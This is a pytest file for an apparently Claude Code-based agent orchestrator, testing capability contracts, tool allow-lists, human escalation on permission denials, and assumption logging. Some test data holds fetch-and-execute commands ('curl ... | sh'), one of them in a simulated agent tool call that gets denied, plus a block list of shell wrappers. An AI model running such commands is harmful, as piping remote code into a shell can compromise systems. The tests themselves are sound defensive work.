"""Autonomy policy (docs/DESIGN.md section 14) with the fake executor: ask before, never during.

The ready guard requires the defaults and capabilities blocks; the loop refuses a contract without them;
dispatch compiles the step's --allowedTools from the pack's run_headless.sh list, the stack's commands and
the contract's capabilities; a permission denial becomes an escalation naming the rule; assumptions are
recorded as evidence, shown in the feed, and fail conformance when they contradict a decision.
"""

from __future__ import annotations

import json
import time
from pathlib import Path

import pytest

from sdlc_graph.impact import capabilities as caps
from sdlc_graph.ledger import decisions, evidence, intake, nodes, transitions
from sdlc_graph.orchestrator import ASSUMPTIONS_KIND, CONFORMANCE_KIND, autonomy, contract_blocks, dispatch, feed, loop, store
from sdlc_graph.orchestrator.steps import STEPS

from test_orchestrator import (A, B, DEFAULTS, FEATURE, blocks, cfg_for, env, feature, repo, state,  # noqa: F401 (fixtures)
                               tick_until)

CONTRACT_MD = """# Per-key rate limiting

## Acceptance criteria

1. AC1 limits

## Allowed paths

- `app/ratelimit/**`
- `tests/ratelimit/**`

## Defaults when ambiguous

- Make the smallest change that satisfies the acceptance criteria.
- Follow the nearest existing pattern
  in the code.
- Prefer the option the Decisions above imply.
- When none applies, choose the reversible option.

## Capabilities

- commands: `python3 -m pytest tests/ratelimit -q`, `bash scripts/smoke_rate_limit.sh`
- egress: none
- data: `redis:rw`
"""


def _wait_finished(conn, slug: str, step: str, n: int = 1, *, cfg=None, limit: int = 400):
    for _ in range(limit):
        loop.orchestrate(FEATURE, cfg, once=True, quiet=True)
        done = [r for r in store.step_runs(conn, slug, step) if r.get("finished_at")]
        if len(done) >= n:
            return done
        time.sleep(0.05)
    raise AssertionError(f"{slug}:{step} did not finish {n} run(s)")


# --------------------------------------------------------------------------- the ready guard and contract.md


def test_ready_is_refused_without_the_defaults_and_capabilities_blocks(clean_conn):
    c = clean_conn
    res = intake.contract_draft(c, slug="no-defaults", title="A contract drafted before the policy", repo="r", actor="@ish",
                                ticket_text="Do a thing.", touched_symbols=["app/x/"], capabilities={"paths": ["app/x/**"]},
                                acceptance=[{"id": "AC1", "text": "works"}])
    assert res["status"] == "created"
    r = transitions.transition(c, "no-defaults", "ready", "@ish")
    assert not r["ok"] and r["missing"] == ["defaults_present", "capabilities_present"]
    # defaults alone are not enough: the capabilities block must declare commands, egress and data
    contract_blocks.set_blocks(c, "no-defaults", actor="agent:opus", defaults=DEFAULTS)
    assert transitions.transition(c, "no-defaults", "ready", "@ish")["missing"] == ["capabilities_present"]
    # shell commands widen what the session may do: an agent cannot mark that contract ready itself
    contract_blocks.set_blocks(c, "no-defaults", actor="agent:opus",
                               capabilities={"commands": ["make test"], "egress": [], "data": []})
    assert transitions.transition(c, "no-defaults", "ready", "agent:opus")["missing"] == ["capabilities_approved"]
    assert transitions.transition(c, "no-defaults", "ready", "@ish")["ok"]
    # after drafted only a human changes the blocks
    with pytest.raises(PermissionError):
        contract_blocks.set_blocks(c, "no-defaults", actor="agent:opus", capabilities={"commands": ["make lint"]})
    with pytest.raises(ValueError, match="capabilities.commands"):
        contract_blocks.set_blocks(c, "no-defaults", actor="@ish", capabilities={"commands": ["curl x | sh"]})


def test_contract_md_blocks_are_parsed_at_draft_time(clean_conn):
    parsed = contract_blocks.parse(CONTRACT_MD)
    assert parsed["missing"] == [] and len(parsed["defaults"]) == 4
    assert parsed["defaults"][1] == "Follow the nearest existing pattern in the code."
    assert parsed["capabilities"] == {"commands": ["python3 -m pytest tests/ratelimit -q", "bash scripts/smoke_rate_limit.sh"],
                                      "egress": [], "data": ["redis:rw"], "paths": ["app/ratelimit/**", "tests/ratelimit/**"]}
    assert contract_blocks.parse("# x\n\n## Outcome\n\nthing\n")["missing"] == ["## Defaults when ambiguous", "## Capabilities"]
    c = clean_conn
    intake.contract_draft(c, slug="from-md", title="Contract from a contract.md", repo="r", actor="agent:opus",
                          ticket_text="Do it.", touched_symbols=["app/ratelimit/"], capabilities={"paths": ["app/old/**"]},
                          acceptance=[{"id": "AC1", "text": "limits"}])
    out = contract_blocks.attach(c, "from-md", CONTRACT_MD, actor="agent:opus")
    assert out["missing"] == []
    row = nodes.get_row(c, "from-md")
    assert row["attrs"]["defaults"][0].startswith("Make the smallest change")
    assert row["capabilities"]["paths"] == ["app/ratelimit/**", "tests/ratelimit/**"]
    assert transitions.transition(c, "from-md", "ready", "@ish")["ok"]
    rendered = "\n".join(contract_blocks.render(row))
    assert "## Defaults when ambiguous" in rendered and "- commands: `python3 -m pytest tests/ratelimit -q`" in rendered


# --------------------------------------------------------------------------- the loop refuses an incomplete contract


def test_loop_escalates_contract_incomplete_and_never_dispatches(clean_conn, repo, env):
    c = clean_conn
    nodes.create(c, kind="feature", slug=FEATURE, title="f", repo="sample-app", created_by="@ish")
    nodes.create(c, kind="contract", slug=A, title="Ready before the policy existed", repo="sample-app", created_by="@ish",
                 state="ready", capabilities={"paths": ["app/ratelimit/**"]}, acceptance=[{"id": "AC1", "text": "x"}])
    nodes.link(c, FEATURE, A, "decomposes_into")
    rep = loop.orchestrate(FEATURE, cfg_for(repo), once=True, quiet=True)["last"]
    entry = {e["slug"]: e for e in rep["contracts"]}[A]
    assert entry["action"] == "contract_incomplete"
    assert entry["detail"]["missing"] == ["## Defaults when ambiguous", "## Capabilities (commands, egress, data)"]
    esc = store.open_escalations(c, [A])
    assert len(esc) == 1 and esc[0]["severity"] == "P1" and esc[0]["question"].startswith("Contract incomplete")
    assert "## Defaults when ambiguous" in esc[0]["question"] and "contract_blocks" in esc[0]["question"]
    assert not store.step_runs(c, A, "tests")
    # a second tick waits on the open decision; still nothing is dispatched
    loop.orchestrate(FEATURE, cfg_for(repo), once=True, quiet=True)
    assert not store.step_runs(c, A, "tests") and len(store.open_escalations(c, [A])) == 1


# --------------------------------------------------------------------------- the compiled allow-list


def test_dispatch_allow_list_has_the_contract_commands_the_stack_and_the_pack_base(feature, repo, env):
    conn = feature
    (repo / ".claude").mkdir(exist_ok=True)
    (repo / ".claude" / "sdlc.json").write_text(json.dumps(
        {"stack": "python", "commands": {"test": "python3 -m pytest -q", "format": "python3 -m ruff format --quiet {file}",
                                         "deploy_local": "docker compose up -d"}}))
    blocks(conn, A, commands=["bash scripts/smoke_rate_limit.sh"])
    env({"*": "hang"})
    cfg = cfg_for(repo, stall_minutes=30, plugin_dirs=[])
    run = dispatch.dispatch(conn, cfg, A, STEPS["ready"], feature=FEATURE, attempt=1)
    from sdlc_graph.orchestrator import watchdog

    try:
        meta = run["meta"]
        tools = Path(meta["allowed_tools_file"]).read_text().splitlines()
        assert "Bash(bash scripts/smoke_rate_limit.sh *)" in tools           # the contract's commands
        assert "Edit(./app/ratelimit/**)" in tools                            # the contract's paths, in the worktree
        assert "Bash(python3 -m pytest -q *)" in tools                        # the stack's test command
        assert "Bash(python3 -m ruff format --quiet *)" in tools              # ... and format, up to its placeholder
        assert not any("docker compose" in t for t in tools)                  # deploy is not a test/lint/format command
        base = autonomy.pack_base_tools(autonomy.find_run_headless([]), [])
        assert "Bash(git status*)" in base and "Bash(git status*)" in tools   # parsed from the pack's run_headless.sh
        assert "Bash(git push -u origin*)" in base and "Bash(git push -u origin*)" not in tools   # not before ship
        assert not any(t.startswith("Bash(git checkout -b") for t in tools)
        assert "mcp__graph__evidence_add" in tools
        assert meta["permission_mode"] == "dontAsk" and meta["permission_prompts"] == "none"
        assert "Bash(git push -u origin*)" in autonomy.allowed_tools(nodes.get_row(conn, A), "ship", cfg)["tools"]
        # the executor is started with the mode, the prompt policy and the list; never --bare
        for _ in range(100):
            log = Path(run["log_path"])
            if log.is_file() and log.read_text().strip():
                break
            time.sleep(0.05)
        init = json.loads(Path(run["log_path"]).read_text().splitlines()[0])
        assert init["permissionMode"] == "dontAsk" and init["permission_prompts"] == "none" and init["tools"] == tools
        prompt = Path(meta["prompt_file"]).read_text()
        assert "Defaults when ambiguous:" in prompt and DEFAULTS[0] in prompt and "assumptions.md" in prompt
        contract = Path(meta["worktree"]) / ".claude" / "work" / A / "contract.md"
        assert "## Capabilities" in contract.read_text()
    finally:
        watchdog.stop(run["pid"])


# --------------------------------------------------------------------------- denials


def test_a_permission_denial_escalates_with_the_rule_named_instead_of_retrying(feature, repo, env):
    conn = feature
    env({f"{A}:tests": "denied"})
    cfg = cfg_for(repo)
    tick_until(conn, cfg, lambda r: bool(store.open_escalations(conn, [A])))
    runs = store.step_runs(conn, A, "tests")
    assert [r["outcome"] for r in runs] == ["permission_denied"]
    esc = store.open_escalations(conn, [A])
    assert len(esc) == 1 and esc[0]["severity"] == "P1"
    q = esc[0]["question"]
    assert "Bash `uv run pytest -q`" in q and "rule that would have allowed it: `Bash(uv run pytest -q *)`" in q
    assert "## Capabilities commands" in q and "Nothing was retried" in q
    assert esc[0]["meta"]["denials"] == [{"tool": "Bash", "target": "uv run pytest -q", "rule": "Bash(uv run pytest -q *)"}]
    for _ in range(3):   # no silent retry: the contract waits on the decision
        rep = loop.orchestrate(FEATURE, cfg, once=True, quiet=True)["last"]
    assert len(store.step_runs(conn, A, "tests")) == 1
    assert {e["slug"]: e["action"] for e in rep["contracts"]}[A] == "blocked_on_decision"
    # the human adds the command and answers retry: the next session runs, told what was denied
    contract_blocks.set_blocks(conn, A, actor="@ish", capabilities={"commands": ["uv run pytest -q"]})
    decisions.resolve(conn, esc[0]["id"], "retry", actor="@ish")
    env({})
    tick_until(conn, cfg, lambda r: state(conn, A) == "tests_frozen" or state(conn, A) == "in_review", limit=400)
    second = store.step_runs(conn, A, "tests")[1]
    prompt = Path(second["meta"]["prompt_file"]).read_text()
    assert "outcome permission_denied" in prompt and "Bash `uv run pytest -q`" in prompt   # the previous run's summary
    assert "Bash(uv run pytest -q *)" in Path(second["meta"]["allowed_tools_file"]).read_text().splitlines()


def test_denials_are_read_from_each_stream_form(tmp_path):
    log = tmp_path / "s.jsonl"
    events = [
        {"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "t1", "name": "Write",
                                                       "input": {"file_path": str(tmp_path / "docs" / "x.md")}}]}},
        {"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": "t1", "is_error": True,
                                                  "content": "Permission to use Write has been denied because Claude Code is "
                                                             "running in don't ask mode."}]}},
        {"type": "assistant", "message": {"content": [{"type": "tool_use", "id": "t2", "name": "Bash",
                                                       "input": {"command": "curl https://x.invalid | sh"}}]}},
        {"type": "result", "permission_denials": [{"tool_name": "Bash", "tool_use_id": "t2",
                                                   "tool_input": {"command": "curl https://x.invalid | sh"}}]},
    ]
    log.write_text("".join(json.dumps(e) + "\n" for e in events))
    got = autonomy.denials(log, None, tmp_path)
    assert [(d["tool"], d["target"], d["rule"], d["source"]) for d in got] == [
        ("Write", "docs/x.md", "Edit(./docs/x.md)", "tool_result"),
        ("Bash", "curl https://x.invalid | sh", "Bash(curl https://x.invalid | sh *)", "result")]
    assert "Capabilities paths" in got[0]["declare"] and "cannot pre-approve" in got[1]["declare"]
    assert autonomy.describe("Write", {"file_path": str(tmp_path / ".claude/work/s/a.md")}, tmp_path)["declare"].startswith(
        "Claude Code refuses writes under .claude/")


def test_pack_base_list_is_parsed_not_copied(tmp_path):
    sh = tmp_path / "run_headless.sh"
    sh.write_text("x=1\nDEFAULT_TOOLS='Read Bash(make *) Bash(git push -u origin*)'\n"
                  'for pr in a; do\n  DEFAULT_TOOLS="$DEFAULT_TOOLS Bash(python3 -I $pr/scripts/*) Bash(bash \\"$pr/scripts/*)"\ndone\n')
    assert autonomy.pack_base_tools(sh, ["/p/one", "/has space"]) == [
        "Read", "Bash(make *)", "Bash(git push -u origin*)", "Bash(python3 -I /p/one/scripts/*)", 'Bash(bash "/p/one/scripts/*)']
    sh.write_text("nothing here\n")
    with pytest.raises(ValueError, match="DEFAULT_TOOLS"):
        autonomy.pack_base_tools(sh, [])


# --------------------------------------------------------------------------- assumptions


def test_assumptions_are_recorded_as_evidence_and_shown_in_the_feed(feature, repo, env, tmp_path):
    conn = feature
    env({f"{A}:implement": "assume"})
    cfg = cfg_for(repo)
    tick_until(conn, cfg, lambda r: state(conn, A) in ("verified", "in_review"))
    rows = evidence.list_for(conn, A, ASSUMPTIONS_KIND)
    assert len(rows) == 1   # recorded once, when the set changed; later steps see the same file
    items = rows[0]["payload"]["assumptions"]
    assert items == [{"default_applied": "followed the nearest existing pattern", "where": "app/ratelimit/**",
                      "why": "the contract does not say how the module is laid out", "decision": "none"}]
    assert rows[0]["payload"]["step"] == "implement" and rows[0]["payload"]["ingested_by"] == "orchestrator"
    lines = [f["what"] for f in feed.feed(conn, feature=FEATURE, limit=500) if f["kind"] == "evidence" and f["slug"] == A]
    assert any(w.startswith(f"assumptions #{rows[0]['id']} ") and "1 default(s) applied (followed the nearest existing "
               "pattern in app/ratelimit/**)" in w for w in lines), lines
    view = conn.execute("SELECT default_applied, \"where\", current FROM assumption WHERE slug = %s", (A,)).fetchall()
    assert [(v["default_applied"], v["current"]) for v in view] == [("followed the nearest existing pattern", True)]
    # the validator keeps the payload shape for anyone else who records the kind
    with pytest.raises(ValueError, match="why"):
        evidence.add(conn, A, ASSUMPTIONS_KIND, {"assumptions": [{"default_applied": "x", "where": "y"}]})


def test_an_assumption_that_contradicts_a_decision_fails_conformance(feature, repo, env, tmp_path):
    conn = feature
    d = decisions.propose(conn, A, "Window: fixed per calendar minute, or sliding 60 s?", ["fixed", "sliding"],
                          actor="agent:opus", recommendation="fixed")
    decisions.resolve(conn, d["id"], "fixed", actor="@ish")
    Path(f"{tmp_path / 'plan.json'}.assumptions.md").write_text(
        "- default_applied: used a sliding window of 60 s\n  where: app/ratelimit/limiter.py\n  why: smallest change\n")
    env({f"{A}:implement:1": "assume"})
    done = _wait_finished(conn, A, "implement", cfg=cfg_for(repo))
    first = done[0]
    assert first["outcome"] == "conformance_low", first
    reasons = first["meta"]["reasons"]
    assert any("applies 'sliding'" in r and f"decision #{d['id']}" in r and "chose 'fixed'" in r for r in reasons), reasons
    conf = [e for e in evidence.list_for(conn, A, CONFORMANCE_KIND) if e["payload"].get("source") == "assumptions"]
    assert conf and conf[-1]["payload"]["score"] == 0.0 and conf[-1]["payload"]["passed"] is False
    # the reviewer and the next session are told; the decision is in the prompt
    second = _wait_finished(conn, A, "implement", 2, cfg=cfg_for(repo))[1]
    prompt = Path(second["meta"]["prompt_file"]).read_text()
    assert "contradicting decision" in prompt and f"#{d['id']} Window" in prompt


def test_assumptions_without_a_defaults_block_and_malformed_items_fail(clean_conn):
    node = {"slug": "x", "attrs": {}}
    found = {"assumptions": [{"default_applied": "a", "where": "b", "why": "c"}], "problems": []}
    assert "no ## Defaults when ambiguous block" in autonomy.assumption_issues(clean_conn, node, found)[0]
    items, problems = autonomy.parse_assumptions("- default_applied: a | where: b | why: c\n- only a sentence\n")
    assert items == [{"default_applied": "a", "where": "b", "why": "c"}] and "missing where, why" in problems[0]
    assert autonomy.contradictions([{"id": 7, "question": "401 or 403?", "options": ["401", "403"], "choice": "401",
                                     "severity": None}], [{"default_applied": "return 403", "where": "w", "why": "y"}])
    assert not autonomy.contradictions([{"id": 7, "question": "q", "options": ["yes", "no"], "choice": "yes", "severity": None}],
                                       [{"default_applied": "no change to the schema", "where": "w", "why": "y"}])
    assert autonomy.contradictions([{"id": 9, "question": "q", "options": [], "choice": "per account", "severity": None}],
                                   [{"default_applied": "per key", "where": "w", "why": "y", "decision": "#9"}])


def test_capabilities_commands_compile_to_bash_rules_and_refuse_wrappers():
    out = caps.compile_capabilities({"paths": ["app/**"], "commands": ["bash scripts/smoke.sh", "make test"]})
    assert {"Bash(bash scripts/smoke.sh *)", "Bash(make test *)", "Edit(./app/**)"} <= set(out["permissions"]["allow"])
    assert not any(r.startswith("Write(") for r in out["permissions"]["allow"])   # Write rules never match (Claude Code permission rules)
    for bad in ("bash", "python3 -c 1", "sudo make", "uv run python -c 1", "ls *", "a && b", "echo $HOME", "node -e 1"):
        with pytest.raises(ValueError, match="capabilities.commands"):
            caps.validate({"commands": [bad]})
